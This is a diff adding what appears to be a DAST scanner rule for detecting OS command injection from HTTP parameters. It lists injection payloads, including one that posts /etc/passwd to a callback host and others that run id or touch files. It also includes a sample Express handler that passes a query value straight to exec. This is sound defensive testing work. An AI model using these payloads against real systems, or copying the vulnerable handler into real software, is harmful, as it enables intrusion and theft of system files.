@@ -1,0 +1,53 @@
+id: dast-http-to-shell
+scanner_type: DAST
+name: HTTP Request Parameter to OS Command Injection
+description: >
+  HTTP request parameter (query string, body, header) flows through
+  an application handler into a shell-executed command.
+  Detected at runtime via instrumented HTTP fuzzing.
+cwe: CWE-78
+severity: Critical
+
+source:
+  type: HTTP_INPUT
+  locations:
+    - req.query.*
+    - req.body.*
+    - req.params.*
+    - req.headers['x-*']
+    - URL path segments
+
+test_payloads:
+  - value: "127.0.0.1; touch /tmp/dast-rce"
+    detection: OOB DNS or file creation
+  - value: "$(curl https://oast.callback.domain/$(whoami))"
+    detection: Out-of-band HTTP callback
+  - value: "`id > /tmp/dast-id`"
+    detection: File creation confirmed by probe
+  - value: "| curl -sX POST https://oast.callback.domain -d $(cat /etc/passwd)"
+    detection: Out-of-band HTTP callback with file contents
+
+sink:
+  type: SHELL_EXEC
+  detection_method: >
+    Runtime observation — either:
+    1. OOB callback received (DNS/HTTP) when payload executes
+    2. Observable side effect (file creation, process spawn) confirmed by probe
+
+chain_with: config-write-to-exec
+
+dast_approach: |
+  1. Instrument application with OOB callback endpoint (OAST)
+  2. Inject test_payloads into each HTTP parameter
+  3. Monitor callback endpoint for hits
+  4. Confirm with follow-up probe (check for file creation, read /tmp/dast-rce)
+  5. Report: parameter name, payload, confirmation method, endpoint URL
+
+attack_example: |
+  GET /api/ping?host=google.com%3Btouch+/tmp/pwned HTTP/1.1
+
+  // Handler:
+  app.get('/api/ping', (req, res) => {
+    exec(`ping -c 1 ${req.query.host}`, callback)  // SINK
+  })
+  // → touch /tmp/pwned executes server-side
